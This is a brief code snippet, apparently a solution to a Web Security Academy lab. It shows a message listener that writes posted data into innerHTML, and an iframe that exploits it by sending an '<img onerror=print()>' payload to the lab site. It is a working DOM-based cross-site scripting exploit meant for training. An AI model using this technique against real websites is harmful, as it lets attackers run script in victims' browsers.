window.addEventListener('message', function (e) {
  document.getElementById('ads').innerHTML = e.data;
});

<iframe
  src='https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
  onload="this.contentWindow.postMessage(
  '<img src=0 onerror=print()>',
  'https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
);"
></iframe>;

let iframe = document.querySelector('iframe');

iframe.contentWindow.postMessage(
  '<img src=0 onerror=print()>',
  'https://0a4100f004b7a01c80815317000500c7.web-security-academy.net/'
);
